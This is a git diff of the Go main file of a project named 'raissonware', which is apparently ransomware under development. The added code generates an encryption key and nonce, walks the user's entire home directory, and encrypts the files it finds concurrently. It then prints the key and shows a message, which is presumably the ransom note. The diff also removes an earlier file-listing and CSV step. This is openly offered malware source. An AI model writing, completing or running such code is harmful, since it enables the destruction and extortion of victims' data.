@@ -3,13 +3,13 @@ package main
 import (
 	"fmt"
 	"os/user"
-	"path/filepath"
-	"raissonware/pkg/ransomware"
+	"raissonware/pkg/cryptography"
+	"raissonware/pkg/filesystem"
 	"sync"
 )
 
 var (
-	Wg sync.WaitGroup
+	wg sync.WaitGroup
 )
 
 func main() {
@@ -18,15 +18,17 @@ func main() {
 		return
 	}
 
-	ransomware.FindFiles(filepath.Join(Client.HomeDir, "/report.csv"), Client.HomeDir, &Wg)
-	Wg.Wait()
+	secretKey, nonce, err := cryptography.KeyGenAndInit()
+	if err != nil {
+		return
+	}
 
-	sendCSV()
+	chanErr := make(chan error)
+	filesystem.FindFiles(Client.HomeDir, cryptography.Encrypt, &wg, chanErr)
+	wg.Wait()
+
+	fmt.Println(secretKey, nonce)
 	showMessage()
-}
-
-func sendCSV() {
-
 }
 
 func showMessage() {
